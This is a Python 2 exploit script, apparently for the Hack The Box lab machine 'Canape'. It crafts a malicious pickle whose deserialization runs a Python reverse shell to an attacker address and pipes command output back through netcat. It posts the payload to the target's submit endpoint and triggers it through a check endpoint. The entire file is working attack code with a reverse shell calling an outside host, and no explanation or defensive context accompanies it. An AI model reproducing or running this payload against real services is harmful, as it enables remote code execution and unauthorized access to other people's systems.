import cPickle
import os
import urllib
import sys
from hashlib import md5
import socket

PREFIX= "echo 'homer'; echo -e $("
SUFFIX = ")\\\n | nc -u 10.10.14.23 6667"
COMMAND = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

class Exploit(object):
    def __reduce__(self):
        return (os.system,(PREFIX+COMMAND+SUFFIX,))

def generate_shellcode(command):
    global COMMAND
    COMMAND = command
    shellcode = cPickle.dumps(Exploit())
    open('/root/Hack-The-Box/Canape/shellcode', 'wb').write(shellcode)
    post = {'character':shellcode[:-2], 'quote':shellcode[-2:]}
    encoded_shellcode = urllib.urlencode(post)
    open('/root/Hack-The-Box/Canape/encoded_shellcode', 'wb').write(encoded_shellcode)

def exploit():
    os.system('curl -X POST -d $(echo $(cat /root/Hack-The-Box/Canape/encoded_shellcode))' \
              ' http://10.10.10.70/submit 1>/dev/null')
    shellcode = open('/root/Hack-The-Box/Canape/shellcode', 'rb').read()
    p_id = md5(shellcode).hexdigest()
    os.system('curl -X POST -d "id=' + p_id + '" http://10.10.10.70/check')

def udp_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('10.10.14.23', 6667))
    while True:
        generate_shellcode(COMMAND)
        exploit()
        print(sock.recv(30000))

if __name__ == '__main__':
    udp_server()

